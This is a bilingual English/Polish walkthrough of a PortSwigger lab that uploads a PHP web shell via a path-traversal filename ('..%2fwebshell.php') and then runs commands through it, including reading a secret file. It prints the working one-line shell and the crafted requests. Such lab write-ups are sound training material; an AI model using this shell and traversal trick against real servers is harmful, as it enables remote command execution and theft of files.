# # Web shell upload via path traversal (ENG 🇬🇧 | PL 🇵🇱 )

🇬🇧 ENG:

Link: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

In this example, we will see how to combine several vulnerabilities - path traversal and file upload.

Click on "**Access the lab**", proceed to "**My Account**", and log in using: "**wiener:peter**".

This is how the panel should look after logging in:

![panel after logging](https://www.dropbox.com/scl/fi/yhwb4ya7a3vx9qyum2pu4/pb-kJacdFYPlG.png?rlkey=ahhwgk4pic4c8kcmublgfwo1w&raw=1)

I have prepared a file named "**webshell.php**", I select it. After uploading the file, I see a message that the file has been uploaded:

![file uploaded](https://www.dropbox.com/scl/fi/kg3rzlnp4noeb594gotpl/pb-yrEvpQesyo.png?rlkey=xx1x2k82euqop0tukplzk2irt&raw=1)

We go back to "My Account", right-click on the file that is visible below, and select "Copy image address":

![copy image](https://www.dropbox.com/scl/fi/x87esgssphhco1drubiuj/pb-a0tR9juNXg.png?rlkey=u9i2c3oe8rcc52w9ahxf18xb5&raw=1)

We see that we can read this file, but it is not executable:

![php file](https://www.dropbox.com/scl/fi/9dzu0amzaa1zesjqmw8yn/pb-5fkb6zAAgw.png?rlkey=r38kjt8w5yfcqd2tuq2n0i4sd&raw=1)

```
<?php system($_GET[ 'cmd']) ;?>
```

In Burp Suite, I send the request responsible for sending our file to the server to "Repeater":

![request to repeater](https://www.dropbox.com/scl/fi/jikwdmq7mbkjrqcchq2h0/pb-HiFbjSfmnX.png?rlkey=r6he0yqjy4q0hrfu45u8h9kgu&raw=1)

It may happen that the folder to which we upload our files has settings that prevent those files from being executed by the PHP engine.

What we can try to do is to upload our file "**webshell.php**" to a different location. We can use path traversal, which is moving between directories, and enter for example two dots and a slash:

```
filename="../webshell.php"
```

After sending such a modified request, we receive information that the file has been uploaded:

part of the request:
```
Content-Disposition: form-data; name="avatar"; filename="..%2fwebshell.php"
Content-Type: text/php
```

response:
```
HTTP/2 200 OK
Date: Mon, 19 Feb 2024 18:50:56 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 136

The file avatars/../webshell.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

It is worth mentioning that the slash above in the request was encoded as %2f.

Let's try to refer to it. However, we will not find it in the same directory as before. It should be located in the directory above. So instead of:

```
https://0a840043037fcbd581e5deef00960003.web-security-academy.net/files/avatars/webshell.php
```

We enter:

```
https://0a840043037fcbd581e5deef00960003.web-security-academy.net/files/webshell.php
```

We see an empty page:

![empty page](https://www.dropbox.com/scl/fi/qztml8mp7avtm9i9aqy80/pb-T0G9fJufNw.png?rlkey=5q7ltq5ih7dhyuevcwlpkrvxc&raw=1)

We change the address, adding the cmd parameter:

```
https://0a840043037fcbd581e5deef00960003.web-security-academy.net/files/webshell.php?cmd=whoami
```

![cmd whoami](https://www.dropbox.com/scl/fi/sdu3a6np81q6p9es0rex4/pb-8oUYs090Ba.png?rlkey=xastm8md4k4c4q4om8ef38aeg&raw=1)

We are the user carlos.

We change the command to:

```
https://0a840043037fcbd581e5deef00960003.web-security-academy.net/files/webshell.php?cmd=cat%20/home/carlos/secret
```

The password appears:

```
7vXvIKxXZ4DaGIbRHxokIWH4V3rKnnlJ
```

![submit](https://www.dropbox.com/scl/fi/q6l8njw4949f7nfnntcy0/pb-5HRA8JhhO3.png?rlkey=3z5vioe8dc8g28f7vz41acnek&raw=1)

We paste it after clicking the "**Submit solution**" button. Click "**OK**".

Lab solved:

![lab solved](https://www.dropbox.com/scl/fi/q41e9b0sut8vjkzs9g76o/pb-klAI5L3GKH.png?rlkey=9l04xhbrfibrimwbd0adquj87&raw=1)

---

🇵🇱 PL:

Link: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

W tym przykładzie zobaczymy, jak można połączyć kilka podatności - path traversal i upload plików.

Klikamy "**Access the lab**", przechodzimy do "**My Account**", logujemy się podając: "**wiener:peter**".

Tak powinien wyglądać panel po zalogowaniu:

![panel after logging](https://www.dropbox.com/scl/fi/yhwb4ya7a3vx9qyum2pu4/pb-kJacdFYPlG.png?rlkey=ahhwgk4pic4c8kcmublgfwo1w&raw=1)

Mam przygotowany plik "**webshell.php**", wybieram go. Po wysłaniu pliku, widzę informację, że plik został załadowany:

![file uploaded](https://www.dropbox.com/scl/fi/kg3rzlnp4noeb594gotpl/pb-yrEvpQesyo.png?rlkey=xx1x2k82euqop0tukplzk2irt&raw=1)

Wracamy do "My Account", klikamy prawym przyciskiem myszy na pliku, który jest widoczny poniżej i wybieramy "Copy image address":

![copy image](https://www.dropbox.com/scl/fi/x87esgssphhco1drubiuj/pb-a0tR9juNXg.png?rlkey=u9i2c3oe8rcc52w9ahxf18xb5&raw=1)

Widzimy, że możemy odczytać ten plik, ale nie jest on wykonywalny:

![php file](https://www.dropbox.com/scl/fi/9dzu0amzaa1zesjqmw8yn/pb-5fkb6zAAgw.png?rlkey=r38kjt8w5yfcqd2tuq2n0i4sd&raw=1)

```
<?php system($_GET[ 'cmd']) ;?>
```

W Burp Suite, request który jest odpowiedzialny za wysłanie naszego pliku do serwera, wysyłam do "Repeatera":

![request to repeater](https://www.dropbox.com/scl/fi/jikwdmq7mbkjrqcchq2h0/pb-HiFbjSfmnX.png?rlkey=r6he0yqjy4q0hrfu45u8h9kgu&raw=1)

Może się tak zdarzyć, że folder do którego wrzucamy nasze pliki, ma takie ustawienia, że te pliki nie są wykonywane przez silnik php.

To, co możemy spróbować zrobić, to wrzucić nasz plik "**webshell.php**" w inne miejsce. Możemy użyć path traversal, czyli przejścia pomiędzy katalogami i wpisać np. dwie kropki i slash:

```
filename="../webshell.php"
```

Po wysłaniu tak zmodyfikowanego requestu, otrzymujemy informację, że plik został zuploadowany:

część requestu:
```
Content-Disposition: form-data; name="avatar"; filename="..%2fwebshell.php"
Content-Type: text/php
```

response:
```
HTTP/2 200 OK
Date: Mon, 19 Feb 2024 18:50:56 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 136

The file avatars/../webshell.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

Warto wspomnieć, że ukośnik powyżej w requeście został zapisany jako %2f.

Spróbujmy się do niego odwołać. Nie znajdziemy go jednak w tym samym katalogu, co wcześniej. Powinien znajdować się w katalogu wyżej. Czyli zamiast:

```
https://0a840043037fcbd581e5deef00960003.web-security-academy.net/files/avatars/webshell.php
```

Wpisujemy:

```
https://0a840043037fcbd581e5deef00960003.web-security-academy.net/files/webshell.php
```

Widzimy pustą stronę:

![empty page](https://www.dropbox.com/scl/fi/qztml8mp7avtm9i9aqy80/pb-T0G9fJufNw.png?rlkey=5q7ltq5ih7dhyuevcwlpkrvxc&raw=1)

Zmieniamy adres, dodając parametr cmd:

```
https://0a840043037fcbd581e5deef00960003.web-security-academy.net/files/webshell.php?cmd=whoami
```

![cmd whoami](https://www.dropbox.com/scl/fi/sdu3a6np81q6p9es0rex4/pb-8oUYs090Ba.png?rlkey=xastm8md4k4c4q4om8ef38aeg&raw=1)

Jesteśmy użytkownikiem carlos.

Zmieniamy komendę na:

```
https://0a840043037fcbd581e5deef00960003.web-security-academy.net/files/webshell.php?cmd=cat%20/home/carlos/secret
```

Pokazuje się hasło:

```
7vXvIKxXZ4DaGIbRHxokIWH4V3rKnnlJ
```

![submit](https://www.dropbox.com/scl/fi/q6l8njw4949f7nfnntcy0/pb-5HRA8JhhO3.png?rlkey=3z5vioe8dc8g28f7vz41acnek&raw=1)

Wklejamy je po kliknięciu przycisku "**Submit solution**". Klikamy "**OK**".

Lab rozwiązany:

![lab solved](https://www.dropbox.com/scl/fi/q41e9b0sut8vjkzs9g76o/pb-klAI5L3GKH.png?rlkey=9l04xhbrfibrimwbd0adquj87&raw=1)

